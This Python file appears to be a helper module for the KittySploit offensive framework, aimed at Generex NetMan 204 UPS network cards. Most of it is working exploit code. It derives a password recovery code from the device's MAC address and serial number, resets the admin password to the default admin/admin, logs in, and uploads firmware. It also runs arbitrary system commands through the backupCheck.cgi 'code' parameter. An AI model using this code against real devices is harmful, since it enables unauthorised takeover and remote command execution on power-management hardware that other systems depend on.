#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import hashlib
import json
from urllib.parse import quote

from core.framework.base_module import BaseModule


class NetMan204(BaseModule):
    """Helpers shared by Generex NetMan 204 modules."""

    DEFAULT_USERNAME = "admin"
    DEFAULT_PASSWORD = "admin"

    @staticmethod
    def netman204_normalize_base_path(path_value: str) -> str:
        value = (path_value or "/").strip()
        if value == "/":
            return "/"
        if not value.startswith("/"):
            value = "/" + value
        return "/" + value.strip("/")

    @staticmethod
    def netman204_join_path(base_path: str, *parts: str) -> str:
        clean = [part.strip("/") for part in parts if part and part.strip("/")]
        root = NetMan204.netman204_normalize_base_path(base_path)
        if not clean:
            return root
        if root == "/":
            return "/" + "/".join(clean)
        return root + "/" + "/".join(clean)

    @staticmethod
    def netman204_json_headers(content_type: str = "application/json"):
        return {
            "User-Agent": "Mozilla/5.0 KittySploit",
            "Accept": "application/json, text/plain, */*",
            "X-Requested-With": "XMLHttpRequest",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": content_type,
            "DNT": "1",
            "Connection": "close",
        }

    @staticmethod
    def netman204_power_headers():
        return {
            "User-Agent": "Mozilla/5.0 KittySploit",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "DNT": "1",
            "Connection": "close",
        }

    def _netman204_base(self) -> str:
        return self.netman204_normalize_base_path(self.path)

    @staticmethod
    def netman204_generate_recovery_code(seed: str) -> str:
        digest = hashlib.md5(seed.encode("utf-8")).hexdigest()
        digest = hashlib.sha1(digest.encode("utf-8")).hexdigest()
        return digest[5:12]

    @staticmethod
    def netman204_recovery_from_mac_serial(mac: str, serial: str) -> str:
        return NetMan204.netman204_generate_recovery_code(f"NMP:{mac}:{serial}")

    def netman204_fetch_device_info(self):
        try:
            response = self.http_request(
                method="GET",
                path=self.netman204_join_path(self._netman204_base(), "json", "netman_data.json"),
                headers=self.netman204_json_headers(),
                timeout=15,
            )
        except Exception:
            return None

        if not response or not getattr(response, "ok", False):
            return None

        try:
            return json.loads(response.text or "{}")
        except Exception:
            return None

    def netman204_login(self, username: str, password: str):
        try:
            response = self.http_request(
                method="GET",
                path=self.netman204_join_path(self._netman204_base(), "cgi-bin", "login.cgi"),
                params={"username": username, "password": password},
                headers=self.netman204_json_headers(),
                session=True,
                timeout=15,
            )
        except Exception:
            return None

        body = response.text or ""
        if not response or "403" in body:
            return None

        cookie_dict = {}
        try:
            payload = json.loads(body or "{}")
            if isinstance(payload, dict):
                cookie_dict = payload
        except Exception:
            cookie_dict = {}

        if not cookie_dict:
            cookie_dict = self.get_cookies()

        return {
            "ok": True,
            "username": username,
            "password": password,
            "cookies": cookie_dict or {},
            "response": response,
        }

    def netman204_logout(self, auth_ctx):
        try:
            return self.http_request(
                method="GET",
                path=self.netman204_join_path(self._netman204_base(), "cgi-bin", "logout.cgi"),
                headers=self.netman204_json_headers(),
                cookies=(auth_ctx or {}).get("cookies") or None,
                timeout=10,
            )
        except Exception:
            return None

    def netman204_reset_password(self, recovery_code: str):
        try:
            response = self.http_request(
                method="POST",
                path=self.netman204_join_path(self._netman204_base(), "cgi-bin", "recover2.cgi"),
                headers=self.netman204_json_headers("application/x-www-form-urlencoded"),
                data=f"code={recovery_code}",
                timeout=15,
            )
        except Exception:
            return None

        if response and "403" not in (response.text or ""):
            return response
        return None

    def netman204_try_login_or_recover(self, username: str, password: str, allow_recovery: bool = True):
        ctx = self.netman204_login(username, password)
        if ctx:
            return ctx

        if not allow_recovery:
            return None

        info = self.netman204_fetch_device_info()
        if not info:
            return None

        mac = info.get("mac_address")
        serial = info.get("serial_number")
        if not mac or not serial:
            return None

        code = self.netman204_recovery_from_mac_serial(mac, serial)
        reset = self.netman204_reset_password(code)
        if not reset:
            return None

        return self.netman204_login(self.DEFAULT_USERNAME, self.DEFAULT_PASSWORD)

    def netman204_upload_firmware(self, auth_ctx, firmware_bytes: bytes, firmware_name: str = "fwapp.204"):
        files = {"filename": (firmware_name, firmware_bytes, "application/octet-stream")}
        try:
            return self.http_request(
                method="POST",
                path=self.netman204_join_path(self._netman204_base(), "cgi-bin", "upload.cgi"),
                headers={
                    "User-Agent": "Mozilla/5.0 KittySploit",
                    "Accept": "application/json, text/plain, */*",
                    "X-Requested-With": "XMLHttpRequest",
                    "Accept-Encoding": "gzip, deflate",
                    "DNT": "1",
                    "Connection": "close",
                },
                cookies=(auth_ctx or {}).get("cookies") or None,
                files=files,
                timeout=60,
            )
        except Exception:
            return None

    def netman204_exec_command(self, command: str):
        try:
            return self.http_request(
                method="GET",
                path=self.netman204_join_path(self._netman204_base(), "cgi-bin", "backupCheck.cgi") + f"?code={quote(command, safe='')}",
                headers=self.netman204_json_headers(),
                timeout=30,
            )
        except Exception:
            return None

    @staticmethod
    def netman204_response_body(response):
        if not response:
            return ""
        data = getattr(response, "text", "")
        return (data or "").replace("<pre>", "").replace("</pre>", "").strip()
